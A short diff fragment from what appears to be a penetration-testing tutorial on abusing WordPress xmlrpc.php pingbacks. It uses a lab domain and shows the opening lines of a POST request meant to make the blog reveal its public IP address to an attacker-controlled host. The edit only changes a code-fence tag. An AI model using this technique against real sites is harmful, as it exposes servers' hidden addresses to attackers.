@@ -375,7 +375,7 @@ Suppose that the WordPress instance residing in http://blog.inlanefreight.com is
 
 As soon as the below request is sent, the attacker-controlled host will receive a request (pingback) originating from ```http://blog.inlanefreight.com```, verifying the pingback and exposing ```http://blog.inlanefreight.com```'s public IP address.
 
-```http
+```
 --> POST /xmlrpc.php HTTP/1.1 
 Host: blog.inlanefreight.com 
 Connection: keep-alive 
